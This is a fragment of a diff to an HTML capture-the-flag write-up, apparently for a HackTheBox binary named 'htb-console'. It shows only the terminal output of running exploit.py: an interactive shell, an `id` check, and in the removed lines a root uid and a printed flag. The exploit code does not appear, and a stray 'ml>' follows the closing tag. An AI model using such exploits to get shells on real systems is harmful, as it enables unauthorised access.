+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './htb-console': pid 288844  
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">id
-uid=0(root) gid=0(root) groups=0(root)
-</span><span class="ro">$ </span><span class="p">cat flag.txt
-HTB{fl@g_a$_a_s3rv1c3?}
+uid=1000(user) gid=1000(user) groups=1000(user)
 </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
@@ -401,3 +307,4 @@ HTB{fl@g_a$_a_s3rv1c3?}
     </div>
   </body>
 </html>
+ml>
